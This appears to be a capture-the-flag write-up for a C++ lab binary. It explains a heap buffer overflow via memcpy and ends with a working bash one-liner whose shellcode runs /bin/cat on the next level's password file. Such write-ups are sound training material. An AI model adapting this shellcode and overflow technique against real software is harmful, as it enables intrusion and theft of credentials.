# level9 

This one is a little different because it's written in C++. 

Ghidra wasn't much help except for hinting us that there's is a allocation of 108 bytes. 
We understand that we have a class N with a particular method : `setAnnotation`. This function performs `memcpy` from argv[1] to the buffer.  

By reading assembly, we notice that there's a function pointer in `edx` at the end of main and that `edx` comes from double dereferencing of `eax` just after the call to this method. 
If argv[1] is longer than 108 bytes, `eax` will be overwritten. 
So we need to create a double pointer that will ultimately point to our shellcode. Here is a visualisation of the memory.

```
|------------| <- 0x0804a00c
|            |
| shell code |
|            |
|------------|
|            |
|  padding   |
|            |
|------------| <- 0x0804a074
| 0x0804a00c |
|------------|
| 0x0804a074 |
|------------|

```

For the shellcode, we'll use the same as level2; we just need to change level3 to bonus0. As a treat we also replace the strings from hexadecimal to ascii. 

```bash
./level9 $(python -c 'print("\x31\xd2\x31\xc0\x52\x68pass\x680//.\x68onus\x68er/b\x68e/us\x68/hom\x89\xe1\x50\x68/cat\x68/bin\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (104 - 59) + "\x08\x04\xa0\x0c"[::-1]) + "\x08\x04\xa0\x74"[::-1]')
```

And it cats our flag :D 
